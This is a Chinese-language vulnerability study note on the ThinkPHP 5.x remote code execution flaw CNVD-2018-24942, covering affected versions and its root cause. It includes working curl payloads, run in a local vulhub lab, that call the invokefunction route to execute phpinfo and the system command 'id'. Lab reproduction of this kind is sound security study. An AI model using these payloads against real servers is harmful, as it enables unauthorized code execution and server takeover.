## 一、产品介绍
### 1.产品定位
ThinkPHP 是国内普及率最高的开源 PHP Web 应用开发框架，核心目标是**简化企业级 Web 应用开发流程、提升敏捷开发效率**。由 TOPThink 团队主导维护，2006年诞生、2007年正式定名，遵循 Apache2 开源许可协议，可免费用于商业和开源项目开发。
### 2.**核心作用**
规范代码架构，实现分层解耦；简化数据库操作，降低SQL开发成本；灵活的路由与请求处理能力 ；内置多层安全防护；降低开发门槛，适配本土需求 
### 3.典型应用场景
- 企业官网、品牌展示站点、个人博客
- 内容管理系统（CMS）、资讯门户后台
- 电商平台后端、小程序/APP 的 API 接口服务
- 企业内部管理系统、OA、CRM 等办公系统
- 中小型 SaaS 服务、快速原型验证项目
### 4.版本发展
ThinkPHP 经历了多代架构迭代，主流版本包括：
- **3.x 系列**：早期经典版本，功能轻量化，大量老项目仍在使用
- **5.x 系列**：架构全面重构，引入 Composer 依赖管理、惰性加载，是国内应用最广的版本
- **6.x 系列**：遵循 PSR 国际规范重构，支持多应用模式，现代化程度大幅提升
- **8.x 系列**：基于 PHP 8.0+ 深度重构，启动速度与内存占用优化显著，适配最新 PHP 语言特性


## 二、漏洞背景
### 1. 基础信息
该漏洞是**ThinkPHP 5.x 系列框架的远程代码执行高危漏洞**，由ThinkPHP官方于2018年12月9日发布安全更新正式披露，同年12月11日被国家信息安全漏洞共享平台（CNVD）收录并分配编号**CNVD-2018-24942**，综合危害评级为**高危**。

### 2. 影响范围⭐
- ThinkPHP 5.0.x 全版本中 **≤ 5.0.22** 的所有版本
- ThinkPHP 5.1.x 全版本中 **≤ 5.1.30** 的所有版本

### 3. 爆发背景与实际影响
- 该漏洞爆发时，ThinkPHP是国内市场占有率最高的国产PHP开发框架，广泛应用于企业官网、内容管理系统、电商平台、小程序接口、政企内部系统等场景。CNVD同期探测数据显示，全球使用ThinkPHP的服务器约4.3万台，其中**中国境内占3.9万台**，受漏洞波及的资产规模极大。
- 漏洞利用门槛极低，漏洞验证代码（POC）公开后迅速出现批量扫描工具，后续更出现Mirai变种蠕虫利用该漏洞批量入侵服务器、组建僵尸网络，大量未及时升级的中小站点和遗留系统遭到入侵，是国内Web安全领域影响深远的经典框架漏洞事件。

## 三、复现过程
环境搭建

```bash
cd vulhub/thinkphp/5-rce #linux
cd vulhub\thinkphp\5-rce #windows
docker-compose up -d
# 默认端口 80
curl http://localhost:8080/
```

漏洞检测：**5.0.x Payload**：

```bash
curl "http://localhost:8080/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
```

返回 `phpinfo()` 页面 → 漏洞存在。

```bash
curl "http://localhost:8080/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
```

返回类似 `uid=33(www-data) gid=33(www-data)`。

## 四、漏洞原理
### 漏洞核心成因
漏洞根源在于框架的路由调度（route/dispatch）模块对URL传入的**控制器名称未做严格的合法性校验与过滤**。 在ThinkPHP默认配置（未开启强制路由）的场景下，攻击者可构造包含特殊命名空间类的URL参数，直接调用框架内置的`\think\App`等核心类的方法，结合PHP回调函数（如`call_user_func_array`）实现任意代码执行、系统命令执行，最终可获取服务器完全控制权限，且攻击全程无需任何授权认证。

> **ThinkPHP 5 的路由解析存在缺陷，攻击者可以控制调用的类和方法，从而调用框架内部危险函数，最终导致任意 PHP 代码执行。**

核心问题：
**用户输入 → 路由解析 → 调用内部类方法 → 参数可控 → PHP函数执行**
